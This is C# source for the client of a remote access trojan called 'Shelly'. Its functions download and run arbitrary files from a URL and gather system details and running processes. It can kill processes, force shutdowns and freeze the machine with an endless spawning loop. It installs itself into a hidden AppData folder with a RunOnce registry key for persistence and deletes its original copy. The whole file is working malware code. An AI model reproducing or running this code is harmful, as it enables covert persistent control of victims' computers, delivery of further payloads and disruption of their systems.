using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Drawing;
using Microsoft.Win32;
using System.Threading;
using System.Management;
using System.Diagnostics;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Drawing.Imaging;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;

namespace Shelly_Client
{
    class Functions
    {
        // General class
        public class General
        {
            // Ping method
            public static string Ping()
            {
                // Create new instance
                using (Ping SendPing = new Ping())
                {
                    // Return ms response
                    return SendPing.Send(Program.ServerIp).RoundtripTime.ToString() + "ms";
                }
            }

            // MsgBox method
            public static void MsgBox(string Message)
            {
                // Create and run task
                Task.Factory.StartNew(() =>
                {
                    // Display messagebox
                    MessageBox.Show(Message);
                });
            }

            // DAE method
            public static void DAE(string Url, string Extention)
            {
                // Create and run task
                Task.Factory.StartNew(() =>
                {
                    // Try to do tasks
                    try
                    {
                        // Set string
                        string FileName = NoneClientRelated.GenerateRandomString(12) + "." + Extention;

                        // Create new instance
                        using (WebClient webClient = new WebClient())
                        {
                            // Download file
                            webClient.DownloadFile(Url, Path.GetTempPath() + FileName);
                        }

                        // Start file
                        Process.Start(Path.GetTempPath() + FileName);

                        // Sleep 30 seconds
                        Thread.Sleep(30000);

                        // Delete file
                        File.Delete(Path.GetTempPath() + FileName);
                    }
                    catch
                    {

                    }
                });
            }

            // OpenWebsite method
            public static void OpenWebsite(string Url)
            {
                // Start IE
                Process.Start("IExplore.exe", Url);
            }

            // GetSystemInfo method
            public static string GetSystemInfo()
            {
                // Create string array
                string[] SysInfo = new string[5];

                // Get computer user name
                SysInfo[1] = Environment.UserName;

                // Get system ram in MB
                var Ram = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory / 1048576 + "MB";
                SysInfo[4] = Ram.ToString();

                // Filter string
                string Filter = "";

                // For loop
                for (int i = 0; i < 3; i++)
                {
                    // Switch
                    switch (i)
                    {
                        // Set filter
                        case 0:

                            // Set filter
                            Filter = "Win32_OperatingSystem";
                            break;

                        // Set filter
                        case 1:

                            // Set filter
                            Filter = "Win32_Processor";
                            break;

                        // Set filter
                        case 2:

                            // Set filter
                            Filter = "Win32_LogicalDisk";
                            break;
                    }

                    // Create new instance
                    using (ManagementObjectSearcher GetDriveName = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM " + Filter))
                    {
                        // Loop though all values
                        foreach (ManagementObject Name in GetDriveName.Get())
                        {
                            // Switch
                            switch (i)
                            {
                                // Get OS name
                                case 0:

                                    // Set string
                                    string input = Name["Name"].ToString();

                                    // Set int
                                    int index = input.IndexOf("|");

                                    // Check if index is greater than 0
                                    if (index > 0)
                                    {
                                        // Trim string
                                        input = input.Substring(0, index);
                                    }

                                    // Add info to array
                                    SysInfo[0] = input;
                                    break;

                                // Get CPU name
                                case 1:

                                    // Get CPU name
                                    SysInfo[2] = Name["Name"].ToString();
                                    break;

                                // Get drive info
                                case 2:

                                    // Get drive info
                                    SysInfo[3] = SysInfo[3] + "Name: " + Name["Caption"].ToString().TrimEnd(':') + " Size: " + (Int64.Parse(Name["Size"].ToString()) / 1073741824) + "GB" + "\n";
                                    break;
                            }
                        }
                    }
                }

                // Return info
                return "Computer name: " + SysInfo[1] + "\n" + "OS: " + SysInfo[0] + "\n" + "CPU: " + SysInfo[2] + "\n" + "Ram: " + SysInfo[4] + "\n" + "Drives:\n\n" + SysInfo[3];
            }

            // GetRunningProcesses method
            public static string GetRunningProcesses()
            {
                // Create new instance NOTE: im not using the cmd method due to it not returning the standard output
                using (Process process = new Process())
                {
                    // Set info
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c tasklist";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.Start();

                    // Return data
                    return process.StandardOutput.ReadToEnd();
                }
            }

            // TerminateProcess method
            public static void TerminateProcess(string ProcessName)
            {
                // Try to terminate process
                try
                {
                    // Loop though and find all equally names processes
                    foreach (var process in Process.GetProcessesByName(ProcessName))
                    {
                        // Kill process
                        process.Kill();
                    }
                } catch
                {

                }
            }
        }

        // Fun class
        public static class Fun
        {
            // CWP method
            public static void CWP(string Url)
            {
                // Create and run task
                Task.Factory.StartNew(() =>
                {
                    // Try to do tasks
                    try
                    {
                        // Set string
                        string FileName = NoneClientRelated.GenerateRandomString(12) + ".png";

                        // Goto temp
                        Directory.SetCurrentDirectory(Path.GetTempPath());

                        // Create new instance
                        using (WebClient webClient = new WebClient())
                        {
                            // Download file
                            webClient.DownloadFile(Url, FileName);
                        }

                        // Set variables
                        string BmpFile = FileName;
                        int index = BmpFile.IndexOf(".");

                        // Check if index is greater than 0
                        if (index > 0)
                        {
                            // Strip file extention
                            BmpFile = BmpFile.Substring(0, index);
                        }

                        // Declair new instance
                        using (Image Img = Image.FromFile(FileName))
                        {
                            // Convert file to bmp
                            Img.Save(BmpFile + ".bmp", ImageFormat.Bmp);
                        }

                        // Delete file
                        File.Delete(FileName);

                        // Set wallpaper
                        NoneClientRelated.ChangeWallpaper(BmpFile + ".bmp");

                        // Delete file
                        File.Delete(BmpFile + ".bmp");

                        // Goto execution path
                        Directory.SetCurrentDirectory(Program.ExecutionPath);
                    }
                    catch
                    {

                    }
                });
            }

            // Freeze method
            public static void Freeze()
            {
                // Infinite loop
                while(true)
                {
                    // Create and run task
                    Task.Factory.StartNew(() =>
                    {
                        // Infinite loop
                        while (true)
                        {
                            // Start idle cmd
                            NoneClientRelated.Cmd("pause");
                        }
                    });
                }
            }

            // Lock method
            public static void Lock(int Seconds)
            {
                // Create and run task
                Task.Factory.StartNew(() =>
                {
                    // Try to lock
                    try
                    {
                        // Create new instance
                        using (Forms.Lock Lock = new Forms.Lock())
                        {
                            // Lock
                            Lock.Show();

                            // Sleep
                            Thread.Sleep(TimeSpan.FromSeconds(Seconds));

                            // Unlock
                            Lock.Hide();
                        }
                    }
                    catch
                    {

                    }
                });
            }
        }

        // PowerOptions class 
        public class PowerOptions
        {
            // Shutdown method
            public static void Shutdown()
            {
                // Shutdown
                NoneClientRelated.Cmd("timeout /t 2 & shutdown /s /t 0 /f");
            }
            
            // Restart method
            public static void Restart()
            {
                // Restart
                NoneClientRelated.Cmd("timeout /t 2 & shutdown /r /t 0 /f");
            }

            // Hibernate method
            public static void Hibernate()
            {
                // Hibernate
                NoneClientRelated.Cmd("timeout /t 2 & rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
            }
        }

        // InstallMethods class
        public static class InstallMethods
        {
            public static void Install()
            {
                // Check if another instance is already installed
                if (Directory.Exists(Program.Appdata + @"\Shelly"))
                {
                    // Melt
                    NoneClientRelated.Cmd("timeout /t 3 & del Shelly.exe");

                    // Exit
                    Environment.Exit(0);
                }

                // Create folder in appdata
                Directory.SetCurrentDirectory(Program.Appdata);
                Directory.CreateDirectory("Shelly");

                // Set folder to system hidden
                NoneClientRelated.Cmd("attrib +S +H Shelly");

                // Copy file to folder
                File.Copy(Program.ExecutionPath + @"\Shelly.exe", Program.Appdata + @"\Shelly\Shelly.exe");

                // Start file
                Directory.SetCurrentDirectory(Program.Appdata + @"\Shelly");
                Process.Start(Program.Appdata + @"\Shelly\Shelly.exe");

                // Add startup key
                StartupKey("Add");

                // Goto initial execution path
                Directory.SetCurrentDirectory(Program.ExecutionPath);

                // Melt
                NoneClientRelated.Cmd("timeout /t 3 & del Shelly.exe");

            }

            public static void Uninstall()
            {
                // Remove startup key
                StartupKey("Remove");

                // Remove folder
                Directory.SetCurrentDirectory(Program.Appdata);
                NoneClientRelated.Cmd("timeout /t 3 & rd /s /q Shelly");
            }

            // Add/remove startup key method
            public static void StartupKey(string AddOrRemove)
            {
                // Open the runonce registry folder
                using (RegistryKey AddKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", true))
                {
                    // If choose equals true, add startup key, if not, remove it
                    if (AddOrRemove == "Add")
                    {
                        // Add key
                        AddKey.SetValue("Shelly", Program.Appdata + @"\Shelly\Shelly.exe");
                    }
                    else
                    {
                        // Delete Key
                        AddKey.DeleteValue("Shelly");
                    }
                }
            }
        }

        // NoneClientRelated class
        public static class NoneClientRelated
        {
            // Run cmd command method
            public static void Cmd(string Command)
            {
                // Declare new instance
                using (var CmdCommand = new Process())
                {
                    // Set start info
                    ProcessStartInfo startInfoMelt = new ProcessStartInfo()
                    {
                        // Set windows style to hidden
                        WindowStyle = ProcessWindowStyle.Hidden,

                        // Set filename to run cmd
                        FileName = "cmd.exe",

                        // Set cmd arguments
                        Arguments = @"/C " + Command
                    };

                    // Set start info
                    CmdCommand.StartInfo = startInfoMelt;

                    // Start cmd with arguments
                    CmdCommand.Start();
                }
            }

            // Import dll
            [DllImport("user32.dll", CharSet = CharSet.Auto)]

            // setup the SystemParametersInfo parameters
            static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

            // Change wallpaper method, NOTE: it has a z at the end so it dosnt mess with the thread naming
            public static void ChangeWallpaper(string PicName)
            {
                // Create new RegistryKey instance 
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);

                // Set the keys
                key.SetValue(@"WallpaperStyle", 2.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());

                // Set wallpaper
                SystemParametersInfo(20, 0, Directory.GetCurrentDirectory() + @"\" + PicName, 0x01 | 0x02);
            }

            // GenerateRandomString method
            private static Random random = new Random();
            public static string GenerateRandomString(int length)
            {
                // Set chars
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

                // Create and return random string
                return new string(Enumerable.Repeat(chars, length)
                  .Select(s => s[random.Next(s.Length)]).ToArray());
            }
        }
    }
}